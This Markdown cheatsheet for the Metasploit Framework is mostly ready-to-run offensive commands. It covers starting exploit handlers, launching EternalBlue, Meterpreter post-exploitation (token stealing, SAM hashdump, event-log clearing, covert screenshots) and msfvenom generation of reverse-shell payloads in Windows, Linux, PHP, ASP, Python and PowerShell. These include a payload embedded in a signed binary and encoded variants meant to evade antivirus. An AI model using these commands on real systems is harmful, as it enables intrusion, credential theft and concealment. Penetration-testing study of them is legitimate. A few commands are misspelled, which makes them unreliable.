---
title: Metasploit
date: 2026-01-22
background: bg-[#2EC4B6]
iconSize: 30
tags:
  - hacking
  - c2
  - penetration testing
  - red teaming
  - malware
categories:
  - Offensive Security Tooling
intro: 
  A quick cheatsheet for common usage and examples of the Metasploit Framework(MSF). Includes common switches, examples, and red team/penetration testing examples. 
plugins:
  - copyCode

---

## Getting Started

### Launch Metasploit
Basic
```bash
msfconsole
```
Quiet Start (No Banner)
```bash
msfconsole -q 
```

start with a resouce script
```bash
msfconsole -r file.rc 
```

### Common Commands
```msf
search <term>                # Search for a module
use <module_path>            # Use a module
info                         # Show module info
show options / show payloads # Show module config
set <OPTION> <VALUE>         # Set module option
setg <OPTION> <VALUE>        # Set global option
unsetg <OPTION>              # Unset global option
run / exploit                # Execute module
exploit -j -z                # Run in bg w/o session
check                        # Test if target is vulnerable
creds                        # List all credentials in the database
```

### Handling Sessions & Jobs 
List all sessions
```msf
sessions -l
```
Connect to a session
```msf
sessions <id>
```
Kill a session
```msf
sessions -k <id>
```

List all running jobs
```msf
jobs -l
```
Kill Specified Job
```msf
jobs -k <id> 
```

### Module Types
| Type | Purpose|
| --- | ----- |
|exploit |	Launch attack|
|payload |	Code delivered to target| 
|auxiliary |	Scanners, fuzzers, etc |
|post |	Post-exploit modules|
|encoder |	Obfuscate payloads |
|evasion	| AV bypass tools |
|nop |	Payload padding | 

### Start a Exploit Handler
```msf
use exploit/multi/handler

set PAYLOAD windows/meterpreter/reverse_tcp

set LHOST <local_ip>

set LPORT <port>

run -j                       # -j backgrounds the handler 
```

### Running an exploit
```msf
use exploit/windows/smb/ms17_010_eternalblue

set payload windows/x64/meterpreter/reverse_https  

set rhost <target_IP>

#if required

set rport <target_port> 

exploit
```

### Common Exploit Functions
| Command   | Description                                               |
| ----      | ----                                                      |
| `check`   | check to see if a target is vulnerable                    |
| `rcheck`  | reloads the module and checks if the target is vulnerable |
| `rerun`   | Alias for rexploit                                        |
| `exploit` | Launch an exploit attempt                                 |
| `run`     | Alias for exploit                                         |

#### Notes:
`check` allows ranges to be noted instead of setting an rhost

```msf
check 127.168.0.0/16, 127.0.0-2.1-4,15 127.0.0.255
```

## Meterpreter

### Core Commands on Session {.row-span-2}
Get System Info
```msf
sysinfo
```
Get user context
```msf
getuid
```

Get Process List
```msf
ps
```

Migrate to new Process
```msf
migrate <pid>
```

Open a system shell (i.e bash/cmd.exe)
```msf
shell
```

Exit the session
```msf
exit
```

Background the session
```msf
background

# Or

bg
```

### File System Commands {.row-span-2}

Get Current Target Working Directory
```msf
pwd

cd # Change Directory
```

Get Current Local Working Directory
```msf
lpwd

lcd # Change Directory 
```

List Files
```msf
ls
```

Transfer Files
```msf

# Target to Local
Download <file>

# Local to Target
Upload <file>
```

View Contents of File
```msf
cat <file>
```

Edit Contents of File In-Line
```msf
edit <file>
```

### System Commands (Windows Focused)
Get the PID Meterpreter is running as
```msf
getpid
```

Run a program "hidden"
```msf
execute -f <exe> -H
```

Clear all Applicaiton/System/Security Event Logs
```msf
# Requires NT/System. Not OPSEC Safe
clearenv
```

Shutdown or Reboot Target
```msf
reboot

shutdown
```


### Route Commands
List All Routes

```msf
route
```

Add Remove A Route
```msf
route [add/remove] <subnet> <netmask> 
```
Delete all routes
```msf
route flush
```

### Collection
Take a Screenshot of the desktop
```msf
secreenshot
```

Creeper Mode: Watch the desktop
```msf
screenshare
```

### Privleges

Steal Impersonation Token
```msf
steal_token
```

Release active impersonation tokens
```msf
drop_token
```

Attempt to Privlege Escalation
```msf
getprivs
```

Attempt to Automate Privlege Escalation using Exploits
```msf
getsystem
```

Attempt to Dump SAM Database
```msf
hashdump
```

## MSFVenom



### Switches {.row-span-2}
| Option           | Description                   |
| ---------------- | ----------------------------- |
| `-p`             | Payload                       |
| `-f`             | Format (`exe`, `elf`, `raw`)  |
| `-o`             | Output file                   |
| `-a`             | Architecture (`x86`, `x64`)   |
| `--platform`     | Platform (`windows`, `linux`) |
| `-b`             | Bad chars (`\x00\x0a`)        |
| `-e`             | Encoder                       |
| `-i`             | Encoding iterations           |
| `-x`             | Template file (exe)           |
| `-s`             | Max size                      |
| `--help-formats` | List all formats              |

### Basic Usage {.col-span-2}

Basic form to create an EXE
```bash
msfvenom -p <payload> LHOST=<listening ip> LPORT=<port> -f exe -o shell.exe
```

Example
```bash
msfvenom -p linux/x86/shell_bind_tcp LPORT=4444 -f elf > bind.elf
```

To get Raw Shellcode for Shellcode Runners
```bash
msfvenom -p<payload> LHOST=<listening ip> LPORT=<port> -f c 
```



### Example  Windows Payloads {.col-span-2}
Standard Reverse Shell EXE on x64 arch
```bash
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.10.14.1 LPORT=4444 -f exe -o shell.exe
```

Stageless Meterpreter Reverse (LARGE FILE)
```bash
msfvenom -p windows/x64/meterpreter_reverse_tcp LHOST=10.10.14.1 LPORT=4444 -f exe -o shell.exe
```

Embed Meterpreter into an Existing Signed Binary
```bash
msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.14.1 LPORT=4444 -x signed.exe -k -f exe -o evil_signed.exe
```


### Example Linux Payloads {.col-span-2}
Reverse shell ELF (x86)
```bash
msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=10.10.14.1 LPORT=4444 -f elf > shell.elf
```

Reverse Shell Bash script (payload as command)
```bash
msfvenom -p cmd/unix/reverse_bash LHOST=10.10.14.1 LPORT=9001 -f raw
```

### Example Web Payloads {.col-span-2}
PHP reverse shell
```bash
msfvenom -p php/meterpreter_reverse_tcp LHOST=10.10.14.1 LPORT=4444 -f raw -o shell.php
```

ASP reverse shell
```bash
msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.14.1 LPORT=4444 -f asp > shell.asp
```

### Example Script Payloads {.col-span-2}

Python Rev Shell
```bash
msfvenom -p python/meterpreter/reverse_tcp LHOST=10.10.14.1 LPORT=4444 -f raw > shell.py
```

Powershell Rev Shell
```bash
msfvenom -p windows/powershell_reverse_tcp LHOST=10.10.14.1 LPORT=9001 -f psh-cmd
```

### Evasion and Obfuscation {.col-span-2}
Encoding with shikata_ga_nai (3 iterations)

```bash
# \ is a line escape in bash allows for continual entry after new line
#NOTE: Does not work on Win 11
msfvenom -p windows/meterpreter/reverse_tcp \
LHOST=10.10.14.1 LPORT=4444 \
-e x86/shikata_ga_nai -i 3 -f exe -o enc_shell.exe
```
Avoiding Bad Characters
```bash
msfvenom -p windows/shell_reverse_tcp \
LHOST=10.10.14.1 LPORT=4444 \
-b '\x00\x0a\x0d' -f exe -o no_badchars.exe
```

Pad The Payload with NOPS
```bash
# -n is nops the number denotes how many nops you want
msfvenom -p windows/shell_reverse_tcp \
LHOST=10.10.14.1 LPORT=4444 \
-n 16 -f exe > nop_shell.exe
```
